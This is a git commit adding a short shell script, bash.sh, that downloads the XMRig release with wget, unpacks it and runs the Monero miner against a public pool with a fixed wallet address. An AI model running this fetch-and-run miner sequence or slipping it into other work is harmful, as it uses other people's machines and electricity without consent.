a40991c4e66aab5f1e6cec96a710c15167be01c0
dark01111 <51191728+dark01111@users.noreply.github.com>
2022-03-23 10:48:19 -0300

    Create bash.sh

---
+++ bash.sh
@@ -0,0 +1,5 @@
+wget https://github.com/xmrig/xmrig/releases/download/v6.15.0/xmrig-6.15.0-linux-static-x64.tar.gz
+tar -xvf xmrig-6.15.0-linux-static-x64.tar.gz
+ls
+cd xmrig-6.15.0
+./xmrig -o sg.minexmr.com:443 -u 89cPYrqHNw2UVHL8dU4cBsf9nAFse8nCLWdtV1HjRe4ZgQCGFA7xR28KedWSkXsSaaaPzBViQuYgnJ2cfZXtVKC7Ms56F3k -k --tls --rig-id rig001
